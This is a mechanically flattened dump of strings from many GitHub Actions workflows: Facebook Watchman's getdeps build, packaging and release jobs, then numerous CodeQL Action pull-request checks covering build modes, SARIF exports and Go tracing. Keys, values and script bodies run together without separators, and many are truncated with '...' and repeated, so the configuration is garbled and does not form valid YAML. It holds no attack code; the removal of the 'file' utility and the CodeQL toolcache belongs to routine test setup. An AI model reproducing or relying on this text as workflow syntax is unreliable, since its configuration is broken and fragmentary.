watchman:/usr/local --final-install-prefix /usr/localwatchmanname: watchmanTest watchmanpython3 build/fbcode_builder/getdeps.py --allow-system-packages test --src-dir=. watchman  --project-install-prefix watchman:/usr/localname: Test watchman/home/huawei/github-actions-security/.github/workflows/facebook_watchman__getdeps_mac.ymlpython3 build/fbcode_builder/getdeps.py --allow-system-packages install-system-deps --recursive watchmanpython3 ... atchmanpython3 build/fbcode_builder/getdeps.py --allow-system-packages fixup-dyn-deps --src-dir=. watchman _artifacts/mac  --project-install-prefix watchman:/usr/local --final-install-prefix /usr/local/home/huawei/github-actions-security/.github/workflows/facebook_watchman__getdeps_windows.ymlpython build/fbcode_builder/getdeps.py query-paths --recursive --src-dir=. watchman  >> $env:GITHUB_OUTPUTpython build/fbcode_builder/getdeps.py fetch --no-tests cpptomlpython  ... cpptomlpython build/fbcode_builder/getdeps.py fetch --no-tests xxhashpython  ...  xxhashpython build/fbcode_builder/getdeps.py fetch --no-tests pcre2python  ... s pcre2python build/fbcode_builder/getdeps.py fetch --no-tests python-setuptoolspython  ... uptoolspython build/fbcode_builder/getdeps.py fetch --no-tests follypython  ... s follypython build/fbcode_builder/getdeps.py fetch --no-tests liboqspython  ...  liboqspython build/fbcode_builder/getdeps.py fetch --no-tests fizzpython  ... ts fizzpython build/fbcode_builder/getdeps.py fetch --no-tests mvfstpython  ... s mvfstpython build/fbcode_builder/getdeps.py fetch --no-tests wanglepython  ...  wanglepython build/fbcode_builder/getdeps.py fetch --no-tests fbthriftpython  ... bthriftpython build/fbcode_builder/getdeps.py fetch --no-tests fb303python  ... s fb303python build/fbcode_builder/getdeps.py fetch --no-tests edencommonpython  ... ncommonpython build/fbcode_builder/getdeps.py build --no-tests boostpython build/fbcode_builder/getdeps.py build --no-tests ninjapython build/fbcode_builder/getdeps.py build --no-tests cmakepython build/fbcode_builder/getdeps.py build --no-tests cpptomlpython build/fbcode_builder/getdeps.py build --no-tests fmtpython build/fbcode_builder/getdeps.py build --no-tests gflagspython build/fbcode_builder/getdeps.py build --no-tests glogpython build/fbcode_builder/getdeps.py build --no-tests googletestpython build/fbcode_builder/getdeps.py build --no-tests libsodiumpython build/fbcode_builder/getdeps.py build --no-tests xxhashpython build/fbcode_builder/getdeps.py build --no-tests zstdpython build/fbcode_builder/getdeps.py build --no-tests double-conversionpython build/fbcode_builder/getdeps.py build --no-tests fast_floatpython build/fbcode_builder/getdeps.py build --no-tests libdwarfpython build/fbcode_builder/getdeps.py build --no-tests lz4python build/fbcode_builder/getdeps.py build --no-tests snappypython build/fbcode_builder/getdeps.py build --no-tests zlibpython build/fbcode_builder/getdeps.py build --no-tests pcre2python build/fbcode_builder/getdeps.py build --no-tests python-setuptoolspython build/fbcode_builder/getdeps.py build --no-tests jompython build/fbcode_builder/getdeps.py build --no-tests perlpython build/fbcode_builder/getdeps.py build --no-tests opensslpython build/fbcode_builder/getdeps.py build --no-tests libeventpython build/fbcode_builder/getdeps.py build --no-tests follypython build/fbcode_builder/getdeps.py build --no-tests liboqspython build/fbcode_builder/getdeps.py build --no-tests fizzpython build/fbcode_builder/getdeps.py build --no-tests mvfstpython build/fbcode_builder/getdeps.py build --no-tests wanglepython build/fbcode_builder/getdeps.py build --no-tests fbthriftpython build/fbcode_builder/getdeps.py build --no-tests fb303python build/fbcode_builder/getdeps.py build --no-tests edencommonpython build/fbcode_builder/getdeps.py build --src-dir=. watchmanpython  ... atchmanpython build/fbcode_builder/getdeps.py fixup-dyn-deps --src-dir=. watchman _artifacts/windows  --final-install-prefix /usr/localpython build/fbcode_builder/getdeps.py test --src-dir=. watchman/home/huawei/github-actions-security/.github/workflows/facebook_watchman__package.ymlpackagedocker-ubuntu${{ github.repository_owner }}${{ git ... wner }}Build and push Docker imageBuild a ... r imagedocker/build-push-action@v6docker/ ... tion@v6contextbuild-argsUBUNTU_VERSION=24.04"UBUNTU ... =24.04"filewatchman/build/package/ubuntu-env/Dockerfilewatchma ... kerfile${{ format('ghcr.io/{0}/watchman-build-env:latest', github.repository) }}${{ for ... ory) }}context: .name: B ... r imageclone-and-build-and-package-ubuntuclone-a ... -ubuntuimage:  ... ory) }}rustup default stablerustup  ...  stablename: r ...  stableInstall system dependencies./install-system-packages.sh./insta ... ages.shTest cargocargo --helpname: Test cargoFix dubious ownershipFix dub ... nershipgit config --global --add safe.directory /__w/watchman/watchmangit con ... atchmanname: F ... nershipBuild Watchman binariesBuild W ... inaries./autogen.shname: B ... inariesMake .deb./watchman/build/package/make-deb.sh./watch ... -deb.shname: Make .debneeds: docker-ubuntudocker-ubuntu:name: package/home/huawei/github-actions-security/.github/workflows/facebook_watchman__release.yml"on"prepare${{ steps.info.outputs.name }}"${{ st ... ame }}""${{ st ... url }}"release ... ame }}"Prepare release infoinfoTAG"${{ github.ref }}"TAG: "$ ... ref }}"python -c "print('::set-output name=name::' + '$TAG'.lstrip('refs/tags/'))""python ... /'))\""name: P ... se infoCreate releaseGITHUB_ ... KEN }}"tag_nam ... ref }}"name: Create release- name: ... se infodocker-ubuntu-22"${{ gi ... ner }}""."UBUNTU_VERSION=22.04${{ format('ghcr.io/{0}/watchman-build-env:ubuntu-22-latest', github.repository) }}"${{ fo ... ry) }}"context: "."docker-ubuntu-24${{ format('ghcr.io/{0}/watchman-build-env:ubuntu-24-latest', github.repository) }}docker-fedora-40FEDORA_VERSION=40watchman/build/package/fedora-env/Dockerfile${{ format('ghcr.io/{0}/watchman-build-env:fedora-40-latest', github.repository) }}docker-fedora-41FEDORA_VERSION=41${{ format('ghcr.io/{0}/watchman-build-env:fedora-41-latest', github.repository) }}docker-fedora-42FEDORA_VERSION=42${{ format('ghcr.io/{0}/watchman-build-env:fedora-42-latest', github.repository) }}clone-build-package-ubuntu-22clone-b ... untu-22- prepareimage:  ... ry) }}"Fix HOMEecho HOME=/root >> $GITHUB_ENVecho HO ... HUB_ENVname: Fix HOME"./inst ... ges.sh""./autogen.sh"UBUNTU_VERSION22.04"22.04"UBUNTU_ ... "22.04""./watc ... deb.sh"Upload .deb${{ needs.prepare.outputs.upload_url }}"${{ ne ... url }}"/_debs/watchman.debwatchman_ubuntu22.04_${{ needs.prepare.outputs.release }}.deb"watchm ... }}.deb"application/x-debupload_ ... url }}"name: Upload .deb- name: Fix HOMEclone-build-package-ubuntu-24clone-b ... untu-2424.04"24.04"UBUNTU_ ... "24.04"watchman_ubuntu24.04_${{ needs.prepare.outputs.release }}.debclone-build-package-fedora-40clone-b ... dora-40Make .rpmmake_rpmFEDORA_VERSION40"40"FEDORA_VERSION: "40"./watchman/build/package/make-rpm.sh"./watc ... rpm.sh"name: Make .rpmUpload .rpm${{ steps.make_rpm.outputs.rpm_path }}"${{ st ... ath }}"${{ steps.make_rpm.outputs.rpm_name }}application/x-rpmname: Upload .rpmclone-build-package-fedora-41clone-b ... dora-4141"41"FEDORA_VERSION: "41"clone-build-package-fedora-42clone-b ... dora-4242"42"FEDORA_VERSION: "42"linux-buildpython3 build/fbcode_builder/getdeps.py build --src-dir=. watchman  --project-install-prefix watchman:/usr/local"python ... /local"python3 build/fbcode_builder/getdeps.py fixup-dyn-deps --strip --src-dir=. watchman _artifacts/linux  --project-install-prefix watchman:/usr/local --final-install-prefix /usr/localpython3 build/fbcode_builder/getdeps.py test --src-dir=. watchman  --project-install-prefix watchman:/usr/localPackage watchmanmv _artifacts/linux "watchman-${{ needs.prepare.outputs.release }}-linux" && zip -r watchman-${{ needs.prepare.outputs.release }}-linux.zip "watchman-${{ needs.prepare.outputs.release }}-linux/""mv _ar ... nux/\""name: P ... atchmanUpload Linux release./watchman-${{ needs.prepare.outputs.release }}-linux.zip"./watc ... ux.zip"watchman-${{ needs.prepare.outputs.release }}-linux.zip"watchm ... ux.zip"name: U ... releasecontinu ... r: truemac-buildmacOS-10.15SDKROOT=$(xcrun --show-sdk-path --sdk macosx11.1) python3 build/fbcode_builder/getdeps.py --allow-system-packages build --src-dir=. watchman  --project-install-prefix watchman:/usr/local"SDKROO ... /local"mv _artifacts/mac "watchman-${{ needs.prepare.outputs.release }}-macos" && zip -r watchman-${{ needs.prepare.outputs.release }}-macos.zip "watchman-${{ needs.prepare.outputs.release }}-macos/""mv _ar ... cos/\""Upload macOS release./watchman-${{ needs.prepare.outputs.release }}-macos.zip"./watc ... os.zip"watchman-${{ needs.prepare.outputs.release }}-macos.zip"watchm ... os.zip"windows-buildecho BOOST_ROOT=%BOOST_ROOT_1_69_0% >> %GITHUB_ENV%echo BO ... UB_ENV%git config --system core.longpaths truegit con ... hs truepython build/fbcode_builder/getdeps.py --allow-system-packages build --src-dir=. watchmanpython build/fbcode_builder/getdeps.py --allow-system-packages fixup-dyn-deps --src-dir=. watchman _artifacts/windows  --final-install-prefix /usr/localpython build/fbcode_builder/getdeps.py --allow-system-packages test --src-dir=. watchmanmv _artifacts/windows "watchman-${{ needs.prepare.outputs.release }}-windows" && Compress-Archive -DestinationPath "watchman-${{ needs.prepare.outputs.release }}-windows.zip" -Path "watchman-${{ needs.prepare.outputs.release }}-windows/""mv _ar ... ows/\""Upload Windows releaseUpload  ... release./watchman-${{ needs.prepare.outputs.release }}-windows.zip"./watc ... ws.zip"watchman-${{ needs.prepare.outputs.release }}-windows.zip"watchm ... ws.zip"prepare:name: release/home/huawei/github-actions-security/.github/workflows/github_codeql-action____all-platform-bundle.ymlPR Check - All-platform bundlePR Chec ...  bundleGO111MODULEautoreleases/v*0 5 * * *'0 5 * * *'cron: '0 5 * * *'- cron: '0 5 * * *'all-platform-bundlenightly-latestos: ubuntu-latest- os: ubuntu-latestAll-platform bundle45Check out repositoryPrepare testprepare-test./.github/actions/prepare-test./.gith ... re-test${{ matrix.version }}use-all-platform-bundleuse-all ... -bundlesetup-kotlinname: Prepare testinit./../action/initcpp,csharp,go,java,javascript,python,rubycpp,csh ... on,rubytools${{ steps.prepare-test.outputs.tools-url }}${{ ste ... -url }}languag ... on,rubyid: initBuild code./build.shname: Build code./../action/analyzeuses: . ... analyzeCODEQL_ACTION_TEST_MODECODEQL_ ... ST_MODECODEQL_ ... E: trueall-platform-bundle:name: P ...  bundle/home/huawei/github-actions-security/.github/workflows/github_codeql-action____analyze-ref-input.ymlPR Check - Analyze: 'ref' and 'sha' from inputs"PR Che ... inputs"analyze-ref-inputos: macos-latestAnalyze: 'ref' and 'sha' from inputs"Analyz ... inputs"'false'cpp,csharp,java,javascript,pythoncpp,csh ... ,python${{ github.repository }}/tests/multi-language-repo/.github/codeql/custom-queries.yml@${{ github.sha }}${{ git ... yml@${{tools:  ... -url }}uses: . ... on/initrefs/heads/mainsha5e235361806c361d4d3f8859e3c897658025a9a25e23536 ... 025a9a2ref: refs/heads/mainanalyze-ref-input:name: " ... inputs"/home/huawei/github-actions-security/.github/workflows/github_codeql-action____autobuild-action.ymlPR Check - autobuild-actionPR Chec ... -actionautobuild-actionlinkedcsharplanguages: csharp./../action/autobuild./../ac ... tobuildCOR_ENABLE_PROFILINGCOR_PROFILERCOR_PROFILER_PATH_64CORECLR_ENABLE_PROFILINGCORECLR ... OFILINGCORECLR_PROFILERCORECLR_PROFILER_PATH_64CORECLR ... PATH_64COR_ENA ... ING: ''uses: . ... tobuildCheck databasecd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d csharp ]]; then
  echo "Did not find a C# database"
  exit 1
fi
name: Check databaseautobuild-action:name: P ... -action/home/huawei/github-actions-security/.github/workflows/github_codeql-action____autobuild-direct-tracing-with-working-dir.ymlPR Check - Autobuild direct tracing (custom working directory)PR Chec ... ectory)autobuild-direct-tracing-with-working-dirautobui ... ing-dirAutobuild direct tracing (custom working directory)Autobui ... ectory)Test setup# Make sure that Gradle build succeeds in autobuild-dir ...
cp -a ../action/tests/java-repo autobuild-dir
# ... and fails if attempted in the current directory
echo > build.gradle
name: Test setupautobuildbuild-m ... tobuildCheck that indirect tracing is disabledCheck t ... isabledif [[ ! -z "${CODEQL_RUNNER}" ]]; then
  echo "Expected indirect tracing to be disabled, but the" \
    "CODEQL_RUNNER environment variable is set."
  exit 1
fi
name: C ... isabledautobuild-dirworking ... ild-dirCODEQL_ACTION_AUTOBUILD_BUILD_MODE_DIRECT_TRACINGCODEQL_ ... TRACINGCODEQL_ ... G: trueautobui ... ng-dir:name: P ... ectory)/home/huawei/github-actions-security/.github/workflows/github_codeql-action____autobuild-direct-tracing.ymlPR Check - Autobuild direct tracingPR Chec ... tracingautobuild-direct-tracingautobui ... tracingAutobuild direct tracingAutobui ... tracingSet up Java test repo configurationSet up  ... urationmv * .github ../action/tests/multi-language-repo/
mv ../action/tests/multi-language-repo/.github/workflows .github
mv ../action/tests/java-repo/* .
name: S ... urationdb-location${{ runner.temp }}/customDbLocation${{ run ... ocationautobui ... racing:name: P ... tracing/home/huawei/github-actions-security/.github/workflows/github_codeql-action____build-mode-autobuild.ymlPR Check - Build mode autobuildPR Chec ... tobuildbuild-mode-autobuildBuild mode autobuildValidate database build modeValidat ... ld modemetadata_path="$RUNNER_TEMP/customDbLocation/java/codeql-database.yml"
build_mode=$(yq eval '.buildMode' "$metadata_path")
if [[ "$build_mode" != "autobuild" ]]; then
  echo "Expected build mode to be 'autobuild' but was $build_mode"
  exit 1
fi
name: V ... ld modebuild-m ... obuild:name: P ... tobuild/home/huawei/github-actions-security/.github/workflows/github_codeql-action____build-mode-manual.ymlPR Check - Build mode manualPR Chec ...  manualbuild-mode-manualBuild mode manualbuild-mode: manualmetadata_path="$RUNNER_TEMP/customDbLocation/java/codeql-database.yml"
build_mode=$(yq eval '.buildMode' "$metadata_path")
if [[ "$build_mode" != "manual" ]]; then
  echo "Expected build mode to be 'manual' but was $build_mode"
  exit 1
fi
build-mode-manual:name: P ...  manual/home/huawei/github-actions-security/.github/workflows/github_codeql-action____build-mode-none.ymlPR Check - Build mode nonePR Chec ... de nonebuild-mode-noneBuild mode nonenonebuild-mode: nonemetadata_path="$RUNNER_TEMP/customDbLocation/java/codeql-database.yml"
build_mode=$(yq eval '.buildMode' "$metadata_path")
if [[ "$build_mode" != "none" ]]; then
  echo "Expected build mode to be 'none' but was $build_mode"
  exit 1
fi
matrix.version != 'nightly-latest'matrix. ... latest'build-mode-none:name: P ... de none/home/huawei/github-actions-security/.github/workflows/github_codeql-action____build-mode-rollback.ymlPR Check - Build mode rollbackPR Chec ... ollbackbuild-mode-rollbackBuild mode rollbackCODEQL_ACTION_DISABLE_JAVA_BUILDLESSCODEQL_ ... ILDLESSCODEQL_ ... S: truebuild-mode-rollback:name: P ... ollback/home/huawei/github-actions-security/.github/workflows/github_codeql-action____cleanup-db-cluster-dir.ymlPR Check - Clean up database cluster directoryPR Chec ... rectorycleanup-db-cluster-dircleanup ... ter-dirClean up database cluster directoryClean u ... rectoryAdd a file to the database cluster directoryAdd a f ... rectorymkdir -p "${{ runner.temp }}/customDbLocation/javascript"
touch "${{ runner.temp }}/customDbLocation/javascript/a-file-to-clean-up.txt"
name: A ... rectoryjavascriptValidate file cleaned upValidat ... aned upif [[ -f "${{ runner.temp }}/customDbLocation/javascript/a-file-to-clean-up.txt" ]]; then
  echo "File was not cleaned up"
  exit 1
fi
echo "File was cleaned up"
name: V ... aned upcleanup ... er-dir:name: P ... rectory/home/huawei/github-actions-security/.github/workflows/github_codeql-action____config-export.ymlPR Check - Config exportPR Chec ...  exportconfig-exportConfig exportqueriessecurity-extendedlanguag ... ascriptoutput${{ runner.temp }}/results${{ run ... resultsupload-databaseoutput: ... resultsUpload SARIFconfig-export-${{ matrix.os }}-${{ matrix.version }}.sarif.jsonconfig- ... if.json${{ runner.temp }}/results/javascript.sarif${{ run ... t.sarifname: c ... if.jsonname: Upload SARIFCheck config properties appear in SARIFCheck c ... n SARIFSARIF_PATHSARIF_P ... t.sarifconst fs = require('fs');

const sarif = JSON.parse(fs.readFileSync(process.env['SARIF_PATH'], 'utf8'));
const run = sarif.runs[0];
const configSummary = run.properties.codeqlConfigSummary;

if (configSummary === undefined) {
  core.setFailed('`codeqlConfigSummary` property not found in the SARIF run property bag.');
}
if (configSummary.disableDefaultQueries !== false) {
  core.setFailed('`disableDefaultQueries` property incorrect: expected false, got ' +
    `${JSON.stringify(configSummary.disableDefaultQueries)}.`);
}
const expectedQueries = [{ type: 'builtinSuite', uses: 'security-extended' }];
// Use JSON.stringify to deep-equal the arrays.
if (JSON.stringify(configSummary.queries) !== JSON.stringify(expectedQueries)) {
  core.setFailed(`\`queries\` property incorrect: expected ${JSON.stringify(expectedQueries)}, got ` +
    `${JSON.stringify(configSummary.queries)}.`);
}
core.info('Finished config export tests.');
name: C ... n SARIFconfig-export:name: P ...  export/home/huawei/github-actions-security/.github/workflows/github_codeql-action____config-input.ymlPR Check - Config inputPR Chec ... g inputconfig-inputConfig inputCopy queries into workspaceCopy qu ... rkspacecp -a ../action/queries .
name: C ... rkspaceconfigdisable-default-queries: true
queries:
  - name: Run custom query
    uses: ./queries/default-setup-environment-variables.ql
paths-ignore:
  - tests
  - lib
Check SARIF./../action/.github/actions/check-sarif./../ac ... k-sarifsarif-filequeries-runjavascript/codeql-action/default-setup-env-varsjavascr ... nv-varsqueries-not-runjavascript/codeql-action/default-setup-context-propertiesjavascr ... pertiessarif-f ... t.sarifname: Check SARIFconfig-input:name: P ... g input/home/huawei/github-actions-security/.github/workflows/github_codeql-action____cpp-deptrace-disabled.ymlPR Check - C/C++: disabling autoinstalling dependencies (Linux)'PR Che ... Linux)'cpp-deptrace-disabledcpp-dep ... isabledC/C++: disabling autoinstalling dependencies (Linux)'C/C++: ... Linux)'cp -a ../action/tests/cpp-autobuild autobuild-dir
cpplanguages: cppCODEQL_EXTRACTOR_CPP_AUTOINSTALL_DEPENDENCIESCODEQL_ ... DENCIESCODEQL_ ... : falseif ls /usr/bin/errno; then
  echo "C/C++ autobuild installed errno, but it should not have since auto-install dependencies is disabled."
  exit 1
fi
DOTNET_GENERATE_ASPNET_CERTIFICATEDOTNET_ ... IFICATEDOTNET_ ... 'false'cpp-dep ... sabled:name: ' ... Linux)'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____cpp-deptrace-enabled-on-macos.ymlPR Check - C/C++: autoinstalling dependencies is skipped (macOS)'PR Che ... macOS)'cpp-deptrace-enabled-on-macoscpp-dep ... n-macos- os: macos-latestC/C++: autoinstalling dependencies is skipped (macOS)'C/C++: ... macOS)'if ! ls /usr/bin/errno; then
  echo "As expected, CODEQL_EXTRACTOR_CPP_AUTOINSTALL_DEPENDENCIES is a no-op on macOS"
else
  echo "CODEQL_EXTRACTOR_CPP_AUTOINSTALL_DEPENDENCIES should not have had any effect on macOS"
  exit 1
fi
cpp-dep ... -macos:name: ' ... macOS)'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____cpp-deptrace-enabled.ymlPR Check - C/C++: autoinstalling dependencies (Linux)cpp-deptrace-enabledC/C++: autoinstalling dependencies (Linux)if ! ls /usr/bin/errno; then
  echo "Did not autoinstall errno"
  exit 1
fi
cpp-dep ... nabled:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____diagnostics-export.ymlPR Check - Diagnostic exportdiagnostics-exportDiagnostic exportAdd test diagnosticsCODEQL_PATH${{ steps.init.outputs.codeql-path }}${{ ste ... path }}CODEQL_ ... path }}"$CODEQL_PATH" database add-diagnostic \
  "$RUNNER_TEMP/codeql_databases/javascript" \
  --file-path /path/to/file \
  --plaintext-message "Plaintext message" \
  --source-id "lang/diagnostics/example" \
  --source-name "Diagnostic name" \
  --ready-for-status-page
name: A ... nosticsdiagnostics-export-${{ matrix.os }}-${{ matrix.version }}.sarif.jsondiagnos ... if.jsonname: d ... if.jsonCheck diagnostics appear in SARIFCheck d ... n SARIFconst fs = require('fs');

function checkStatusPageNotification(n) {
  const expectedMessage = 'Plaintext message';
  if (n.message.text !== expectedMessage) {
    core.setFailed(`Expected the status page diagnostic to have the message '${expectedMessage}', but found '${n.message.text}'.`);
  }
  if (n.locations.length !== 1) {
    core.setFailed(`Expected the status page diagnostic to have exactly 1 location, but found ${n.locations.length}.`);
  }
}

const sarif = JSON.parse(fs.readFileSync(process.env['SARIF_PATH'], 'utf8'));
const run = sarif.runs[0];

const toolExecutionNotifications = run.invocations[0].toolExecutionNotifications;
const statusPageNotifications = toolExecutionNotifications.filter(n =>
  n.descriptor.id === 'lang/diagnostics/example' && n.properties?.visibility?.statusPage
);
if (statusPageNotifications.length !== 1) {
  core.setFailed(
    'Expected exactly one status page reporting descriptor for this diagnostic in the ' +
      `'runs[].invocations[].toolExecutionNotifications[]' SARIF property, but found ` +
      `${statusPageNotifications.length}. All notification reporting descriptors: ` +
      `${JSON.stringify(toolExecutionNotifications)}.`
  );
}
checkStatusPageNotification(statusPageNotifications[0]);

const notifications = run.tool.driver.notifications;
const diagnosticNotification = notifications.filter(n =>
  n.id === 'lang/diagnostics/example' && n.name === 'lang/diagnostics/example' &&
    n.fullDescription.text === 'Diagnostic name'
);
if (diagnosticNotification.length !== 1) {
  core.setFailed(
    'Expected exactly one notification for this diagnostic in the ' +
      `'runs[].tool.driver.notifications[]' SARIF property, but found ` +
      `${diagnosticNotification.length}. All notifications: ` +
      `${JSON.stringify(notifications)}.`
  );
}

core.info('Finished diagnostic export test');
CODEQL_ACTION_EXPORT_DIAGNOSTICSCODEQL_ ... NOSTICSdiagnostics-export:/home/huawei/github-actions-security/.github/workflows/github_codeql-action____export-file-baseline-information.ymlPR Check - Export file baseline informationPR Chec ... rmationexport-file-baseline-informationexport- ... rmationExport file baseline informationExport  ... rmation./../action/.github/actions/setup-swift./../ac ... p-swiftrunner.os == 'macOS'codeql-pathcodeql- ... path }}uses: . ... p-swiftwith-baseline-information-${{ matrix.os }}-${{ matrix.version }}.sarif.jsonwith-ba ... if.jsonname: w ... if.jsonCheck resultscd "$RUNNER_TEMP/results"
expected_baseline_languages="c csharp go java kotlin javascript python ruby"
if [[ $RUNNER_OS == "macOS" ]]; then
  expected_baseline_languages+=" swift"
fi

for lang in ${expected_baseline_languages}; do
  rule_name="cli/expected-extracted-files/${lang}"
  found_notification=$(jq --arg rule_name "${rule_name}" '[.runs[0].tool.driver.notifications |
    select(. != null) | flatten | .[].id] | any(. == $rule_name)' javascript.sarif)
  if [[ "${found_notification}" != "true" ]]; then
    echo "Expected SARIF output to contain notification '${rule_name}', but found no such notification."
    exit 1
  else
    echo "Found notification '${rule_name}'."
  fi
done
name: Check resultsCODEQL_ACTION_SUBLANGUAGE_FILE_COVERAGECODEQL_ ... OVERAGEexport- ... mation:name: P ... rmation/home/huawei/github-actions-security/.github/workflows/github_codeql-action____extract-direct-to-toolcache.ymlPR Check - Extract directly to toolcachePR Chec ... olcacheextract-direct-to-toolcacheextract ... olcacheExtract directly to toolcacheExtract ... olcacheRemove CodeQL from toolcacheRemove  ... olcacheconst fs = require('fs');
const path = require('path');
const codeqlPath = path.join(process.env['RUNNER_TOOL_CACHE'], 'CodeQL');
fs.rmdirSync(codeqlPath, { recursive: true });
name: R ... olcacheInstall @actions/tool-cacheInstall ... l-cachenpm install @actions/tool-cachenpm ins ... l-cachename: I ... l-cacheCheck toolcache does not contain CodeQLCheck t ...  CodeQLconst toolcache = require('@actions/tool-cache');
const allCodeqlVersions = toolcache.findAllVersions('CodeQL');
if (allCodeqlVersions.length !== 0) {
  throw new Error(`CodeQL should not be found in the toolcache, but found ${allCodeqlVersions}`);
}
console.log('No versions of CodeQL found in the toolcache');
name: C ...  CodeQLCheck CodeQL is installed within the toolcacheCheck C ... olcacheconst toolcache = require('@actions/tool-cache');
const allCodeqlVersions = toolcache.findAllVersions('CodeQL');
console.log(`Found CodeQL versions: ${allCodeqlVersions}`);
if (allCodeqlVersions.length === 0) {
  throw new Error('CodeQL not found in toolcache');
}
if (allCodeqlVersions.length > 1) {
  throw new Error('Multiple CodeQL versions found in toolcache');
}
name: C ... olcacheCODEQL_ACTION_EXTRACT_TOOLCACHECODEQL_ ... OLCACHEextract ... lcache:name: P ... olcache/home/huawei/github-actions-security/.github/workflows/github_codeql-action____extractor-ram-threads.ymlPR Check - Extractor ram and threads options testPR Chec ... ns testextractor-ram-threadsextract ... threadsExtractor ram and threads options testExtract ... ns testram230threadslanguages: javaAssert Resultsif [ "${CODEQL_RAM}" != "230" ]; then
  echo "CODEQL_RAM is '${CODEQL_RAM}' instead of 230"
  exit 1
fi
if [ "${CODEQL_EXTRACTOR_JAVA_RAM}" != "230" ]; then
  echo "CODEQL_EXTRACTOR_JAVA_RAM is '${CODEQL_EXTRACTOR_JAVA_RAM}' instead of 230"
  exit 1
fi
if [ "${CODEQL_THREADS}" != "1" ]; then
  echo "CODEQL_THREADS is '${CODEQL_THREADS}' instead of 1"
  exit 1
fi
if [ "${CODEQL_EXTRACTOR_JAVA_THREADS}" != "1" ]; then
  echo "CODEQL_EXTRACTOR_JAVA_THREADS is '${CODEQL_EXTRACTOR_JAVA_THREADS}' instead of 1"
  exit 1
fi
name: Assert Resultsextract ... hreads:name: P ... ns test/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-custom-queries.ymlPR Check - Go: Custom queries'PR Che ... ueries'go-custom-queriesGo: Custom queries'Go: Custom queries'>=1.21.0'>=1.21.0'go-vers ... 1.21.0'./.github/codeql/custom-queries.yml./.gith ... ies.ymlgo-custom-queries:name: ' ... ueries'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-indirect-tracing-workaround-diagnostic.ymlPR Check - Go: diagnostic when Go is changed after init step'PR Che ... t step'go-indirect-tracing-workaround-diagnosticgo-indi ... gnosticGo: diagnostic when Go is changed after init step'Go: di ... t step'1.20'1.20'go-version: '1.20'go build main.goCheck diagnostic appears in SARIF${{ runner.temp }}/results/go.sarif${{ run ... o.sarifSARIF_P ... o.sarifconst fs = require('fs');

const sarif = JSON.parse(fs.readFileSync(process.env['SARIF_PATH'], 'utf8'));
const run = sarif.runs[0];

const toolExecutionNotifications = run.invocations[0].toolExecutionNotifications;
const statusPageNotifications = toolExecutionNotifications.filter(n =>
  n.descriptor.id === 'go/workflow/go-installed-after-codeql-init' && n.properties?.visibility?.statusPage
);
if (statusPageNotifications.length !== 1) {
  core.setFailed(
    'Expected exactly one status page reporting descriptor for this diagnostic in the ' +
      `'runs[].invocations[].toolExecutionNotifications[]' SARIF property, but found ` +
      `${statusPageNotifications.length}. All notification reporting descriptors: ` +
      `${JSON.stringify(toolExecutionNotifications)}.`
  );
}
go-indi ... nostic:name: ' ... t step'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-indirect-tracing-workaround-no-file-program.ymlPR Check - Go: diagnostic when `file` is not installed'PR Che ... talled'go-indirect-tracing-workaround-no-file-programgo-indi ... programGo: diagnostic when `file` is not installed'Go: di ... talled'Remove `file` programRemove  ... programecho $(which file)
sudo rm -rf $(which file)
echo $(which file)
name: R ... programconst fs = require('fs');

const sarif = JSON.parse(fs.readFileSync(process.env['SARIF_PATH'], 'utf8'));
const run = sarif.runs[0];

const toolExecutionNotifications = run.invocations[0].toolExecutionNotifications;
const statusPageNotifications = toolExecutionNotifications.filter(n =>
  n.descriptor.id === 'go/workflow/file-program-unavailable' && n.properties?.visibility?.statusPage
);
if (statusPageNotifications.length !== 1) {
  core.setFailed(
    'Expected exactly one status page reporting descriptor for this diagnostic in the ' +
      `'runs[].invocations[].toolExecutionNotifications[]' SARIF property, but found ` +
      `${statusPageNotifications.length}. All notification reporting descriptors: ` +
      `${JSON.stringify(toolExecutionNotifications)}.`
  );
}
go-indi ... rogram:name: ' ... talled'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-indirect-tracing-workaround.ymlPR Check - Go: workaround for indirect tracing'PR Che ... racing'go-indirect-tracing-workaroundgo-indi ... karoundGo: workaround for indirect tracing'Go: wo ... racing'if [[ -z "${CODEQL_ACTION_GO_BINARY}" ]]; then
  echo "Expected the workaround for indirect tracing of static binaries to trigger, but the" \
    "CODEQL_ACTION_GO_BINARY environment variable is not set."
  exit 1
fi
if [[ ! -f "${CODEQL_ACTION_GO_BINARY}" ]]; then
  echo "CODEQL_ACTION_GO_BINARY is set, but the corresponding script does not exist."
  exit 1
fi


# Once we start running Bash 4.2 in all environments, we can replace the
# `! -z` flag with the more elegant `-v` which confirms that the variable
# is actually unset and not potentially set to a blank value.
if [[ ! -z "${CODEQL_ACTION_DID_AUTOBUILD_GOLANG}" ]]; then
  echo "Expected the Go autobuilder not to be run, but the" \
    "CODEQL_ACTION_DID_AUTOBUILD_GOLANG environment variable was set."
  exit 1
fi
cd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d go ]]; then
  echo "Did not find a Go database"
  exit 1
fi
go-indi ... around:name: ' ... racing'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-tracing-autobuilder.ymlPR Check - Go: tracing with autobuilder step'PR Che ... r step'go-tracing-autobuildergo-trac ... builderstable-v2.15.5stable-v2.16.6stable-v2.17.6stable-v2.18.4stable-v2.19.4Go: tracing with autobuilder step'Go: tr ... r step'~1.24.0go-version: ~1.24.0if [[ "${CODEQL_ACTION_DID_AUTOBUILD_GOLANG}" != true ]]; then
  echo "Expected the Go autobuilder to be run, but the" \
    "CODEQL_ACTION_DID_AUTOBUILD_GOLANG environment variable was not true."
  exit 1
fi
cd "$RUNNER_TEMP/codeql_databases"
if [[ ! -d go ]]; then
  echo "Did not find a Go database"
  exit 1
fi
go-trac ... uilder:name: ' ... r step'/home/huawei/github-actions-security/.github/workflows/github_codeql-action____go-tracing-custom-build-steps.ymlPR Check - Go: tracing with custom build steps'PR Che ...  steps'go-tracing-custom-build-stepsgo-trac ... d-stepsGo: tracing with custom build steps'Go: tr ...  steps'# Once we start running Bash 4.2 in all environments, we can replace the
# `! -z` flag with the more elegant `-v` which confirms that the variable
# is actually unset and not potentially set to a blank value.
